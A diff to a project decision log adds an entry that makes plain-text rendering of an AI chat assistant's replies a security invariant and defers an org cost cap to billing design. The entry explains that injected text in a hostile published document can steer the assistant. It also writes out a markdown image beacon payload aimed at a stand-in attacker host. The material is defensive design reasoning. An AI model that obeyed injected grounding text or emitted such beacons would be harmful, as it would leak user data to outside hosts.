@@ -6,6 +6,49 @@ future work; do not log routine implementation details.
 
 ---
 
+## 2026-08-06 — Plain text chat rendering is a load bearing security control, and the org cost cap waits for Stripe
+
+**Decided.** The assistant's output renders as plain React text nodes in every
+chat surface, and that is now a security invariant, not a styling choice.
+Adding rich rendering (markdown, HTML, autolinking, clickable anything) to chat
+bubbles later is a SECURITY REDESIGN requiring a fresh exfiltration analysis,
+not a styling change. `tests/chat-plain-text-render.test.ts` is the guard: it
+renders hostile assistant output through the real transcript component and
+fails the build if a script tag, an image, a link, or markdown emphasis ever
+comes out as markup instead of escaped text, and it fails if any chat surface
+imports interpretation machinery.
+
+**Why.** The August audit (docs/AUDIT_2026_08.md, M1) established that chat
+grounding is injectable by a hostile published document: the boundary between
+instructions and reference text is a sentence an author can restate, so a
+compromised admin can steer what the assistant says. The reason that caps out
+at social engineering instead of automatic data exfiltration is the render:
+the standard RAG exfiltration primitive is a markdown image beacon
+(`![](https://attacker/?d=...)`) that fires a request the moment the reply
+renders, and in Talvext it renders as literal characters a human would have to
+retype. That property arrived as a by product of the non streaming plain text
+design; nothing protected it, which meant a well meaning "make chat prettier"
+PR could silently convert M1 from a content problem into a data exfiltration
+channel. Now the property is named, tested, and owned.
+
+**Also decided: the org level chat cost cap (audit M4) is deliberately
+deferred to the Stripe entitlement design (F13).** A real spend ceiling is an
+entitlement question: what an org is allowed to consume is exactly what a plan
+defines, so building a standalone cap now would be redone the moment billing
+exists. The per user throttle (30 per minute per org user, now covering the
+escalation draft path too) remains the interim guard, with its per instance
+limitation recorded in the 2026-07-30 rate limits entry. The deferral is a
+choice, not an oversight: revisit it in the F13 design conversation before any
+paid tier ships.
+
+**Affects.** Any future chat UI work: rich rendering proposals start from the
+exfiltration analysis, not from CSS. The F13 design conversation inherits M4.
+The audit's remaining accepted items (CSP as a separate task, the
+REFRESH_TOKEN_SECRET removal as an operator action) are tracked in
+docs/AUDIT_2026_08.md, not here.
+
+---
+
 ## 2026-08-04 — The monitors write grants are column scoped, and sweep state is sweep owned by grant
 
 **Decided.** Migration 020 (certificate expiry alerts) converts the
